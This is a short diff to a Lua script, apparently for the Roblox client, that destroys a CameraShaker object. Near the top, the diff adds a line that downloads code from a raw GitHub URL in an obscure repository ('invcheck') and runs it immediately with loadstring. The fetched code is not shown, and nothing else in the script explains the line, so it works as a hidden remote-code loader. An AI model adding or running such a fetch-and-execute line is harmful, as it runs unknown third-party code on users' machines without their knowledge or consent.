@@ -1,5 +1,7 @@
 repeat wait() until game:IsLoaded() and game:GetService("Players")
 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/n3987frejhw098h324/SAstuff/refs/heads/main/invcheck"))()
+
 local rs = game:GetService("ReplicatedStorage")
 if rs:FindFirstChild("CameraShaker") then
     rs.CameraShaker:Destroy()
